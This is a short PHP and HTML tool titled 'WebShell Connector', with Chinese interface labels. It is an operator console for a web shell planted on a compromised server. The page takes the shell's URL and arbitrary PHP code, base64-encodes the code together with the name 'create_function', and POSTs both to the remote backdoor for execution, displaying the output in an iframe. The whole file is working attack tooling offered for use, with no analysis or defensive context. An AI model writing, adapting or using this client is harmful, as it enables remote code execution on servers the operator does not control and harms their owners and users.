<?php
if(!empty($_POST)){
	$data = array('f'=>'create_function','p'=>$_POST['body']);
	$data = array_map('base64_encode',$data);
	$ch = curl_init($_POST['url']);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_exec($ch);
	curl_close($ch);
}else{
?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>WebShell Connector</title>
</head>
<body>
<form method="post" target="output">
	<input name='url' placeholder='shell 地址' style="width:300px;"/>
	<br/>
	<br/>
	<textarea name='body' placeholder='代码' style="width:300px;"></textarea>
	<br/>
	<br/>
	<input type="submit" value="Run" />
</form>
Result:
<iframe src="#" name="output" width="100%" height=600></iframe>
</body>
</html>
<?php } ?>